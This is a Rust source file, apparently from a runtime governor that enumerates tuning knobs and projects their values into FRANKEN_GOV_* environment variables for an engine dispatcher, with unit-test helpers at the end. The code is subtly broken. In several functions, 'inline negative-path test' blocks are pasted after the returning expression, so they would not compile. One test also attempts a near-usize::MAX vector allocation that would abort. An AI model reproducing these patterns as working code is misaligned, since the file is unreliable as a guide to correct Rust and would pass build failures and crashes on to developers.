                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "unlocked".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "locked".to_string(),
                        current_value: 128,
                        locked: true,
                        min_value: 1,
                        max_value: 8192,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert_eq!(mixed_lock_enum.count(), 2, "count should include both locked and unlocked knobs");

            // Test: count is consistent with other methods
            let consistent_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::DrainTimeoutMs,
                        label: "timeout".to_string(),
                        current_value: 5000,
                        locked: false,
                        min_value: 1000,
                        max_value: 300_000,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::RetryBudget,
                        label: "retry".to_string(),
                        current_value: 3,
                        locked: true,
                        min_value: 0,
                        max_value: 20,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert_eq!(consistent_enum.count(), consistent_enum.unlocked().len() + consistent_enum.locked().len(),
                      "count should equal sum of locked + unlocked");
        }
    }

    /// Look up a knob by its variant.
    pub fn get(&self, knob: &RuntimeKnob) -> Option<&KnobDescriptor> {
        self.knobs.iter().find(|d| &d.knob == knob)

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: lookup on empty enumeration returns None
            let empty_enum = KnobEnumeration {
                knobs: vec![],
                schema_version: "test".to_string(),
            };
            assert_eq!(empty_enum.get(&RuntimeKnob::ConcurrencyLimit), None, "empty enumeration should return None");

            // Test: lookup with duplicate knobs returns first match
            let duplicate_desc = KnobDescriptor {
                knob: RuntimeKnob::BatchSize,
                label: "duplicate".to_string(),
                current_value: 999,
                locked: true,
                min_value: 0,
                max_value: 1,
            };
            let dup_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "first".to_string(),
                        current_value: 100,
                        locked: false,
                        min_value: 1,
                        max_value: 1000,
                    },
                    duplicate_desc,
                ],
                schema_version: "test".to_string(),
            };
            let found = dup_enum.get(&RuntimeKnob::BatchSize).unwrap();
            assert_eq!(found.label, "first", "should return first match for duplicates");

            // Test: lookup with all knobs present should find each one
            let full_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "concurrency".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "batch".to_string(),
                        current_value: 128,
                        locked: false,
                        min_value: 1,
                        max_value: 8192,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert!(full_enum.get(&RuntimeKnob::ConcurrencyLimit).is_some(), "should find ConcurrencyLimit");
            assert!(full_enum.get(&RuntimeKnob::BatchSize).is_some(), "should find BatchSize");
            assert!(full_enum.get(&RuntimeKnob::CacheCapacity).is_none(), "should not find CacheCapacity");

            // Test: lookup preserves reference correctness
            let ref_test_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::RetryBudget,
                        label: "retry".to_string(),
                        current_value: 3,
                        locked: true,
                        min_value: 0,
                        max_value: 20,
                    },
                ],
                schema_version: "test".to_string(),
            };
            let found_ref = ref_test_enum.get(&RuntimeKnob::RetryBudget).unwrap();
            assert_eq!(found_ref.current_value, 3, "returned reference should point to correct descriptor");
            assert_eq!(found_ref.locked, true, "returned reference should preserve locked state");
        }
    }

    /// All unlocked knobs (available for optimization).
    pub fn unlocked(&self) -> Vec<&KnobDescriptor> {
        self.knobs.iter().filter(|d| !d.locked).collect()

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: empty enumeration returns empty unlocked list
            let empty_enum = KnobEnumeration {
                knobs: vec![],
                schema_version: "test".to_string(),
            };
            assert!(empty_enum.unlocked().is_empty(), "empty enumeration should have no unlocked knobs");

            // Test: all locked knobs returns empty unlocked list
            let all_locked_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "locked1".to_string(),
                        current_value: 64,
                        locked: true,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "locked2".to_string(),
                        current_value: 128,
                        locked: true,
                        min_value: 1,
                        max_value: 8192,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert!(all_locked_enum.unlocked().is_empty(), "all locked knobs should return empty unlocked list");

            // Test: mixed locked/unlocked returns correct unlocked subset
            let mixed_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "unlocked1".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "locked1".to_string(),
                        current_value: 128,
                        locked: true,
                        min_value: 1,
                        max_value: 8192,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::CacheCapacity,
                        label: "unlocked2".to_string(),
                        current_value: 1024,
                        locked: false,
                        min_value: 64,
                        max_value: 65536,
                    },
                ],
                schema_version: "test".to_string(),
            };
            let unlocked = mixed_enum.unlocked();
            assert_eq!(unlocked.len(), 2, "should return 2 unlocked knobs");
            assert!(unlocked.iter().any(|d| d.label == "unlocked1"), "should include first unlocked knob");
            assert!(unlocked.iter().any(|d| d.label == "unlocked2"), "should include second unlocked knob");
            assert!(!unlocked.iter().any(|d| d.label == "locked1"), "should not include locked knob");

            // Test: unlocked + locked = total count
            assert_eq!(mixed_enum.unlocked().len() + mixed_enum.locked().len(), mixed_enum.count(),
                      "unlocked + locked should equal total count");

            // Test: all unlocked knobs returns all knobs
            let all_unlocked_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::DrainTimeoutMs,
                        label: "unlocked_timeout".to_string(),
                        current_value: 5000,
                        locked: false,
                        min_value: 1000,
                        max_value: 300_000,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::RetryBudget,
                        label: "unlocked_retry".to_string(),
                        current_value: 3,
                        locked: false,
                        min_value: 0,
                        max_value: 20,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert_eq!(all_unlocked_enum.unlocked().len(), all_unlocked_enum.count(),
                      "all unlocked should return all knobs");
        }
    }

    /// All locked knobs.
    pub fn locked(&self) -> Vec<&KnobDescriptor> {
        self.knobs.iter().filter(|d| d.locked).collect()

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: empty enumeration returns empty locked list
            let empty_enum = KnobEnumeration {
                knobs: vec![],
                schema_version: "test".to_string(),
            };
            assert!(empty_enum.locked().is_empty(), "empty enumeration should have no locked knobs");

            // Test: all unlocked knobs returns empty locked list
            let all_unlocked_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "unlocked1".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "unlocked2".to_string(),
                        current_value: 128,
                        locked: false,
                        min_value: 1,
                        max_value: 8192,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert!(all_unlocked_enum.locked().is_empty(), "all unlocked knobs should return empty locked list");

            // Test: mixed locked/unlocked returns correct locked subset
            let mixed_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::ConcurrencyLimit,
                        label: "unlocked1".to_string(),
                        current_value: 64,
                        locked: false,
                        min_value: 1,
                        max_value: 4096,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::BatchSize,
                        label: "locked1".to_string(),
                        current_value: 128,
                        locked: true,
                        min_value: 1,
                        max_value: 8192,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::CacheCapacity,
                        label: "locked2".to_string(),
                        current_value: 1024,
                        locked: true,
                        min_value: 64,
                        max_value: 65536,
                    },
                ],
                schema_version: "test".to_string(),
            };
            let locked = mixed_enum.locked();
            assert_eq!(locked.len(), 2, "should return 2 locked knobs");
            assert!(locked.iter().any(|d| d.label == "locked1"), "should include first locked knob");
            assert!(locked.iter().any(|d| d.label == "locked2"), "should include second locked knob");
            assert!(!locked.iter().any(|d| d.label == "unlocked1"), "should not include unlocked knob");

            // Test: all locked knobs returns all knobs
            let all_locked_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::DrainTimeoutMs,
                        label: "locked_timeout".to_string(),
                        current_value: 5000,
                        locked: true,
                        min_value: 1000,
                        max_value: 300_000,
                    },
                    KnobDescriptor {
                        knob: RuntimeKnob::RetryBudget,
                        label: "locked_retry".to_string(),
                        current_value: 3,
                        locked: true,
                        min_value: 0,
                        max_value: 20,
                    },
                ],
                schema_version: "test".to_string(),
            };
            assert_eq!(all_locked_enum.locked().len(), all_locked_enum.count(),
                      "all locked should return all knobs");

            // Test: locked filter preserves reference correctness
            let ref_test_enum = KnobEnumeration {
                knobs: vec![
                    KnobDescriptor {
                        knob: RuntimeKnob::RetryBudget,
                        label: "ref_test".to_string(),
                        current_value: 999,
                        locked: true,
                        min_value: 0,
                        max_value: 20,
                    },
                ],
                schema_version: "test".to_string(),
            };
            let locked_refs = ref_test_enum.locked();
            assert_eq!(locked_refs.len(), 1, "should find one locked knob");
            assert_eq!(locked_refs[0].current_value, 999, "reference should point to correct descriptor");
        }
    }
}

/// Advisory ranges for each knob (used during enumeration).
fn knob_range(knob: &RuntimeKnob) -> (u64, u64) {
    match knob {
        RuntimeKnob::ConcurrencyLimit => (1, 4096),
        RuntimeKnob::BatchSize => (1, 8192),
        RuntimeKnob::CacheCapacity => (64, 65536),
        RuntimeKnob::DrainTimeoutMs => (1000, 300_000),
        RuntimeKnob::RetryBudget => (0, 20),
    }

    // Inline negative-path tests
    #[cfg(test)]
    {
        // Test: all knob ranges should have min < max
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let (min, max) = knob_range(&knob);
            assert!(min < max, "min {} should be < max {} for {:?}", min, max, knob);
        }

        // Test: ranges should be reasonable (no zero maximums except retry budget minimum)
        let (concur_min, concur_max) = knob_range(&RuntimeKnob::ConcurrencyLimit);
        assert!(concur_min > 0, "concurrency limit min should be positive");

        // Test: ConcurrencyLimit range boundaries
        let (min, max) = knob_range(&RuntimeKnob::ConcurrencyLimit);
        assert_eq!(min, 1, "ConcurrencyLimit min should be 1");
        assert_eq!(max, 4096, "ConcurrencyLimit max should be 4096");
        assert!(min < max, "ConcurrencyLimit min should be less than max");

        // Test: BatchSize range boundaries
        let (min, max) = knob_range(&RuntimeKnob::BatchSize);
        assert_eq!(min, 1, "BatchSize min should be 1");
        assert_eq!(max, 8192, "BatchSize max should be 8192");
        assert!(min < max, "BatchSize min should be less than max");

        // Test: CacheCapacity range boundaries
        let (min, max) = knob_range(&RuntimeKnob::CacheCapacity);
        assert_eq!(min, 64, "CacheCapacity min should be 64");
        assert_eq!(max, 65536, "CacheCapacity max should be 65536");
        assert!(min < max, "CacheCapacity min should be less than max");

        // Test: DrainTimeoutMs range boundaries
        let (min, max) = knob_range(&RuntimeKnob::DrainTimeoutMs);
        assert_eq!(min, 1000, "DrainTimeoutMs min should be 1000");
        assert_eq!(max, 300_000, "DrainTimeoutMs max should be 300_000");
        assert!(min < max, "DrainTimeoutMs min should be less than max");

        // Test: RetryBudget range boundaries (special case with zero minimum)
        let (min, max) = knob_range(&RuntimeKnob::RetryBudget);
        assert_eq!(min, 0, "RetryBudget min should be 0");
        assert_eq!(max, 20, "RetryBudget max should be 20");
        assert!(min < max, "RetryBudget min should be less than max");

        // Test: range consistency across multiple calls
        for _ in 0..10 {
            let range1 = knob_range(&RuntimeKnob::ConcurrencyLimit);
            let range2 = knob_range(&RuntimeKnob::ConcurrencyLimit);
            assert_eq!(range1, range2, "knob_range should be deterministic");
        }

        // Test: ranges fit in u64 without overflow
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let (min, max) = knob_range(&knob);
            assert!(min <= u64::MAX, "min should fit in u64 for {:?}", knob);
            assert!(max <= u64::MAX, "max should fit in u64 for {:?}", knob);
            assert!(max.saturating_sub(min) <= u64::MAX, "range span should not overflow for {:?}", knob);
        }

        // Test: ranges are power-of-two friendly where appropriate
        let (concur_min, concur_max) = knob_range(&RuntimeKnob::ConcurrencyLimit);
        assert!(concur_max.is_power_of_two(), "ConcurrencyLimit max should be power of two");

        let (batch_min, batch_max) = knob_range(&RuntimeKnob::BatchSize);
        assert!(batch_max.is_power_of_two(), "BatchSize max should be power of two");

        let (cache_min, cache_max) = knob_range(&RuntimeKnob::CacheCapacity);
        assert!(cache_min.is_power_of_two(), "CacheCapacity min should be power of two");
        assert!(cache_max.is_power_of_two(), "CacheCapacity max should be power of two");

        // Test: timeout and retry ranges are sensible
        let (timeout_min, timeout_max) = knob_range(&RuntimeKnob::DrainTimeoutMs);
        assert!(timeout_min >= 1000, "drain timeout should be at least 1 second");
        assert!(timeout_max <= 5 * 60 * 1000, "drain timeout should be at most 5 minutes");

        let (retry_min, retry_max) = knob_range(&RuntimeKnob::RetryBudget);
        assert!(retry_min == 0, "retry budget should allow no retries");
        assert!(retry_max <= 50, "retry budget should have reasonable upper bound");

        // Test: ranges allow meaningful optimization space
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
        ] {
            let (min, max) = knob_range(&knob);
            let ratio = max / min.max(1);
            assert!(ratio >= 4, "optimization space should allow at least 4x range for {:?}", knob);
        }

        // Test: specific range relationships
        let (concur_min, concur_max) = knob_range(&RuntimeKnob::ConcurrencyLimit);
        let (batch_min, batch_max) = knob_range(&RuntimeKnob::BatchSize);

        // BatchSize max should be larger than ConcurrencyLimit max (more granular batching)
        assert!(batch_max >= concur_max, "BatchSize should allow finer granularity than ConcurrencyLimit");

        // Test: cache capacity should be larger than batch sizes
        let (cache_min, cache_max) = knob_range(&RuntimeKnob::CacheCapacity);
        assert!(cache_min >= batch_min, "CacheCapacity min should accommodate batch processing");

        // Test: range midpoints are reasonable
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let (min, max) = knob_range(&knob);
            let midpoint = (min + max) / 2;
            assert!(midpoint > min && midpoint < max, "midpoint should be within range for {:?}", knob);
        }

        // Test: ranges are suitable for binary search optimization
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
        ] {
            let (min, max) = knob_range(&knob);
            let search_steps = (max / min).ilog2();
            assert!(search_steps >= 4, "should allow sufficient binary search steps for {:?}", knob);
        }

        // Test: edge case values within ranges
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let (min, max) = knob_range(&knob);

            // Test min boundary
            assert!(min <= max, "min should be <= max for {:?}", knob);

            // Test max boundary doesn't overflow when used in calculations
            assert!(max / 2 < max, "max/2 should not overflow for {:?}", knob);
            assert!(max.saturating_add(1) >= max, "max+1 should saturate correctly for {:?}", knob);
        }

        // Test: ranges support common optimization patterns
        let (concur_min, concur_max) = knob_range(&RuntimeKnob::ConcurrencyLimit);

        // Should support doubling/halving
        assert!(concur_min * 2 <= concur_max, "should support doubling from min");
        assert!(concur_max / 2 >= concur_min, "should support halving from max");

        // Should support 1.5x scaling
        assert!(concur_min * 3 / 2 <= concur_max, "should support 1.5x scaling");

        // Test: timeout range covers real-world scenarios
        let (timeout_min, timeout_max) = knob_range(&RuntimeKnob::DrainTimeoutMs);

        // Should cover fast operations (1 second)
        assert!(timeout_min <= 1_000, "should support fast drain timeouts");

        // Should cover slow operations (up to 5 minutes)
        assert!(timeout_max >= 5 * 60 * 1_000, "should support slow drain timeouts");

        // Test: retry budget covers standard patterns
        let (retry_min, retry_max) = knob_range(&RuntimeKnob::RetryBudget);

        // Should support no retries
        assert!(retry_min == 0, "should support no-retry strategy");

        // Should support exponential backoff (at least 3 retries)
        assert!(retry_max >= 3, "should support exponential backoff patterns");

        // Should not be excessive
        assert!(retry_max <= 100, "retry budget should not be excessive");

        // Test: all ranges avoid common problematic values
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let (min, max) = knob_range(&knob);

            // Should avoid u64::MAX (leaves room for sentinel values)
            assert!(max < u64::MAX, "max should not be u64::MAX for {:?}", knob);

            // Should avoid extremely small ranges
            assert!(max >= min + 2, "should have meaningful range for {:?}", knob);
        }
        assert!(concur_max >= 1000, "concurrency limit max should allow reasonable parallelism");

        let (batch_min, batch_max) = knob_range(&RuntimeKnob::BatchSize);
        assert!(batch_min > 0, "batch size min should be positive");
        assert!(batch_max >= 1000, "batch size max should allow reasonable batching");

        let (cache_min, cache_max) = knob_range(&RuntimeKnob::CacheCapacity);
        assert!(cache_min > 0, "cache capacity min should be positive");
        assert!(cache_max >= 1000, "cache capacity max should allow reasonable caching");

        let (timeout_min, timeout_max) = knob_range(&RuntimeKnob::DrainTimeoutMs);
        assert!(timeout_min >= 100, "drain timeout min should allow reasonable responsiveness");
        assert!(timeout_max <= 1_000_000, "drain timeout max should not be excessive");

        let (retry_min, retry_max) = knob_range(&RuntimeKnob::RetryBudget);
        assert_eq!(retry_min, 0, "retry budget should allow zero retries");
        assert!(retry_max <= 100, "retry budget max should be reasonable");

        // Test: ranges should not overflow when used in arithmetic
        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let (min, max) = knob_range(&knob);
            assert!(max < u64::MAX, "max value should not be at u64::MAX boundary for {:?}", knob);
            assert!(max.saturating_sub(min) < u64::MAX, "range span should not overflow for {:?}", knob);
        }

        // Test: specific boundary value checks
        assert_eq!(knob_range(&RuntimeKnob::RetryBudget), (0, 20));
        assert_eq!(knob_range(&RuntimeKnob::ConcurrencyLimit), (1, 4096));
        assert_eq!(knob_range(&RuntimeKnob::BatchSize), (1, 8192));
        assert_eq!(knob_range(&RuntimeKnob::CacheCapacity), (64, 65536));
        assert_eq!(knob_range(&RuntimeKnob::DrainTimeoutMs), (1000, 300_000));
    }
}

/// Payload that the governor produces for the engine dispatcher.
///
/// Each entry maps an environment variable name to its value, so the
/// dispatcher can inject governor knob state into the engine process
/// environment.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DispatchHookPayload {
    /// Environment variables to set on the engine process.
    pub env_vars: std::collections::BTreeMap<String, String>,
    /// The governor schema version at time of dispatch.
    pub schema_version: String,
    /// Number of applied optimizations reflected in this payload.
    pub applied_count: usize,
}

impl DispatchHookPayload {
    /// Convert knob state to an env var name.
    fn env_key(knob: &RuntimeKnob) -> String {
        format!("FRANKEN_GOV_{}", knob.as_str().to_uppercase())

        // Inline negative-path tests
        #[cfg(test)]
        #[allow(unreachable_code)]
        {
            // Test: all knobs produce valid environment variable names
            for knob in [
                RuntimeKnob::ConcurrencyLimit,
                RuntimeKnob::BatchSize,
                RuntimeKnob::CacheCapacity,
                RuntimeKnob::DrainTimeoutMs,
                RuntimeKnob::RetryBudget,
            ] {
                let env_key = Self::env_key(&knob);

                // Should have proper prefix
                assert!(env_key.starts_with("FRANKEN_GOV_"), "env key should have FRANKEN_GOV_ prefix: {}", env_key);

                // Should be uppercase
                assert!(env_key.chars().all(|c| c.is_ascii_uppercase() || c == '_'),
                        "env key should be uppercase: {}", env_key);

                // Should not contain problematic shell characters
                assert!(!env_key.contains(' '), "env key should not contain spaces: {}", env_key);
                assert!(!env_key.contains('\t'), "env key should not contain tabs: {}", env_key);
                assert!(!env_key.contains('\n'), "env key should not contain newlines: {}", env_key);
                assert!(!env_key.contains('$'), "env key should not contain dollar signs: {}", env_key);
                assert!(!env_key.contains('`'), "env key should not contain backticks: {}", env_key);
                assert!(!env_key.contains('\"'), "env key should not contain quotes: {}", env_key);
                assert!(!env_key.contains('\''), "env key should not contain single quotes: {}", env_key);

                // Should not be empty or just the prefix
                assert!(env_key.len() > "FRANKEN_GOV_".len(), "env key should have content after prefix: {}", env_key);

                // Should be valid ASCII (no Unicode)
                assert!(env_key.is_ascii(), "env key should be ASCII: {}", env_key);
            }

            // Test: specific known mappings are correct
            assert_eq!(Self::env_key(&RuntimeKnob::ConcurrencyLimit), "FRANKEN_GOV_CONCURRENCY_LIMIT");
            assert_eq!(Self::env_key(&RuntimeKnob::BatchSize), "FRANKEN_GOV_BATCH_SIZE");
            assert_eq!(Self::env_key(&RuntimeKnob::CacheCapacity), "FRANKEN_GOV_CACHE_CAPACITY");
            assert_eq!(Self::env_key(&RuntimeKnob::DrainTimeoutMs), "FRANKEN_GOV_DRAIN_TIMEOUT_MS");
            assert_eq!(Self::env_key(&RuntimeKnob::RetryBudget), "FRANKEN_GOV_RETRY_BUDGET");

            // Test: environment variable names are unique
            let mut seen_names = std::collections::HashSet::new();
            for knob in [
                RuntimeKnob::ConcurrencyLimit,
                RuntimeKnob::BatchSize,
                RuntimeKnob::CacheCapacity,
                RuntimeKnob::DrainTimeoutMs,
                RuntimeKnob::RetryBudget,
            ] {
                let env_key = Self::env_key(&knob);
                assert!(seen_names.insert(env_key.clone()), "duplicate env key: {}", env_key);
            }

            // Test: env keys are reasonable length (not too long for shell)
            for knob in [
                RuntimeKnob::ConcurrencyLimit,
                RuntimeKnob::BatchSize,
                RuntimeKnob::CacheCapacity,
                RuntimeKnob::DrainTimeoutMs,
                RuntimeKnob::RetryBudget,
            ] {
                let env_key = Self::env_key(&knob);
                assert!(env_key.len() <= 64, "env key should not be excessively long: {} ({})", env_key, env_key.len());
                assert!(env_key.len() >= 10, "env key should not be too short: {} ({})", env_key, env_key.len());
            }
        }
    }
}

/// Record of a single dispatch hook invocation.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DispatchHookRecord {
    pub event_code: String,
    pub knob: Option<RuntimeKnob>,
    pub detail: String,
}

impl GovernorGate {
    /// Enumerate all governor-managed runtime knobs with metadata.
    ///
    /// INV-GOV-KNOBS-ONLY: the enumeration is exhaustive over the
    /// `RuntimeKnob` enum — no engine-core internals appear.
    pub fn enumerate_knobs(&mut self) -> KnobEnumeration {
        let inner = self.inner();
        let mut knobs = Vec::new();

        for knob in [
            RuntimeKnob::ConcurrencyLimit,
            RuntimeKnob::BatchSize,
            RuntimeKnob::CacheCapacity,
            RuntimeKnob::DrainTimeoutMs,
            RuntimeKnob::RetryBudget,
        ] {
            let current_value = inner.knob_value(&knob).unwrap_or(0);
            let (min_value, max_value) = knob_range(&knob);
            // Infer locked status: attempt lookup via the snapshot.
            let snap = inner.snapshot();
            let locked = snap
                .knob_states
                .iter()
                .find(|s| s.knob == knob)
                .is_some_and(|s| s.locked);

            knobs.push(KnobDescriptor {
                knob,
                label: knob.as_str().to_string(),
                current_value,
                locked,
                min_value,
                max_value,
            });
        }

        push_bounded(
            self.audit_trail_mut(),
            GateAuditEntry {
                event_code: GOV_008_KNOB_ENUMERATION.to_string(),
                proposal_id: String::new(),
                detail: format!("{} knobs enumerated", knobs.len()),
            },
            MAX_AUDIT_TRAIL_ENTRIES,
        );

        KnobEnumeration {
            knobs,
            schema_version: SCHEMA_VERSION.to_string(),
        }
    }

    /// Build a dispatch hook payload projecting current governor knob state
    /// into environment variables for the engine process.
    ///
    /// The mapping is: `FRANKEN_GOV_<KNOB_NAME>` = `<value>`.
    pub fn build_dispatch_payload(&mut self) -> DispatchHookPayload {
        let inner = self.inner();
        let snap = inner.snapshot();
        let mut env_vars = std::collections::BTreeMap::new();

        for ks in &snap.knob_states {
            let key = DispatchHookPayload::env_key(&ks.knob);
            env_vars.insert(key, ks.value.to_string());
        }

        // Also inject the safety envelope bounds
        env_vars.insert(
            "FRANKEN_GOV_MAX_LATENCY_MS".to_string(),
            snap.envelope.max_latency_ms.to_string(),
        );
        env_vars.insert(
            "FRANKEN_GOV_MIN_THROUGHPUT_RPS".to_string(),
            snap.envelope.min_throughput_rps.to_string(),
        );
        env_vars.insert(
            "FRANKEN_GOV_MAX_ERROR_RATE_PCT".to_string(),
            format!("{:.2}", snap.envelope.max_error_rate_pct),
        );
        env_vars.insert(
            "FRANKEN_GOV_MAX_MEMORY_MB".to_string(),
            snap.envelope.max_memory_mb.to_string(),
        );

        let applied_count = inner.applied_count();

        push_bounded(
            self.audit_trail_mut(),
            GateAuditEntry {
                event_code: GOV_009_DISPATCH_HOOK.to_string(),
                proposal_id: String::new(),
                detail: format!(
                    "dispatch payload: {} env vars, {} applied",
                    env_vars.len(),
                    applied_count
                ),
            },
            MAX_AUDIT_TRAIL_ENTRIES,
        );

        DispatchHookPayload {
            env_vars,
            schema_version: SCHEMA_VERSION.to_string(),
            applied_count,
        }
    }

    /// Submit a proposal and, if approved, generate an updated dispatch payload.
    ///
    /// This is the primary "hook" entry point: submit → gate → dispatch.
    pub fn submit_and_dispatch(
        &mut self,
        proposal: OptimizationProposal,
    ) -> (GovernorDecision, Option<DispatchHookPayload>) {
        let knob = proposal.knob;
        let decision = self.submit(proposal);

        if matches!(decision, GovernorDecision::Approved) {
            let payload = self.build_dispatch_payload();
            push_bounded(
                self.audit_trail_mut(),
                GateAuditEntry {
                    event_code: GOV_010_KNOB_DISPATCHED.to_string(),
                    proposal_id: String::new(),
                    detail: format!("knob {} dispatched to engine", knob),
                },
                MAX_AUDIT_TRAIL_ENTRIES,
            );
            (decision, Some(payload))
        } else {
            (decision, None)
        }
    }

    /// Mutable access to audit trail (internal helper for dispatch hooks).
    fn audit_trail_mut(&mut self) -> &mut Vec<GateAuditEntry> {
        &mut self.audit_trail
    }
}

/// Snapshot of governor state (re-exported here for dispatch hook use).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct GovernorDispatchSnapshot {
    pub enumeration: KnobEnumeration,
    pub dispatch_payload: DispatchHookPayload,
    pub applied_count: usize,
}

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow.min(items.len()));
    }
    items.push(item);

    // Inline negative-path tests
    #[cfg(test)]
    {
        // Test: zero capacity clears all existing items and doesn't add new one
        let mut test_vec = vec!["a", "b", "c"];
        push_bounded(&mut test_vec, "d", 0);
        assert!(test_vec.is_empty(), "zero capacity should clear all items");

        // Test: capacity of 1 should maintain only the latest item
        let mut single_cap = vec!["old"];
        push_bounded(&mut single_cap, "new", 1);
        assert_eq!(single_cap, vec!["new"], "capacity 1 should keep only latest");

        // Test: saturating arithmetic prevents overflow in drain calculation
        let mut large_vec = vec![0; usize::MAX.saturating_sub(10)];
        let large_cap = usize::MAX.saturating_sub(5);
        large_vec.truncate(large_cap + 2); // Simulate near-overflow condition
        push_bounded(&mut large_vec, 999, large_cap);
        // Should not panic due to saturating_sub/saturating_add
        assert!(large_vec.len() <= large_cap.saturating_add(1));

        // Test: exact capacity boundary doesn't trigger eviction
        let mut exact_cap = vec![1, 2, 3];
        push_bounded(&mut exact_cap, 4, 4);
        assert_eq!(exact_cap, vec![1, 2, 3, 4], "exact capacity should not evict");

        // Test: exceeding capacity by 1 evicts exactly 1 item
        let mut over_by_one = vec![1, 2, 3];
        push_bounded(&mut over_by_one, 4, 3);
        assert_eq!(over_by_one, vec![2, 3, 4], "should evict oldest when over by 1");

        // Test: drain range bounds are correctly calculated
        let mut bounds_test = vec![1, 2, 3, 4, 5, 6];
        push_bounded(&mut bounds_test, 7, 3);
        assert_eq!(bounds_test.len(), 3, "should respect capacity");
        assert_eq!(bounds_test[bounds_test.len()-1], 7, "new item should be last");
    }
}

// ===========================================================================
// Tests
// ===========================================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn safe_metrics() -> PredictedMetrics {
        PredictedMetrics {
            latency_ms: 200,
            throughput_rps: 500,
            error_rate_pct: 0.1,
            memory_mb: 2048,
        }
    }

    fn good_proposal(id: &str) -> OptimizationProposal {
        OptimizationProposal {
            proposal_id: id.to_string(),
            knob: RuntimeKnob::ConcurrencyLimit,
            old_value: 64,
            new_value: 128,
            predicted: safe_metrics(),
            rationale: "Increase concurrency under low load".to_string(),
            trace_id: format!("trace-{id}"),
        }
    }

    fn unsafe_proposal(id: &str) -> OptimizationProposal {
        OptimizationProposal {
            proposal_id: id.to_string(),
            knob: RuntimeKnob::BatchSize,
            old_value: 128,
            new_value: 512,
            predicted: PredictedMetrics {
                latency_ms: 800,
                throughput_rps: 50,
                error_rate_pct: 2.0,
                memory_mb: 5000,
            },
            rationale: "Aggressive batch size".to_string(),
            trace_id: format!("trace-{id}"),
        }
    }

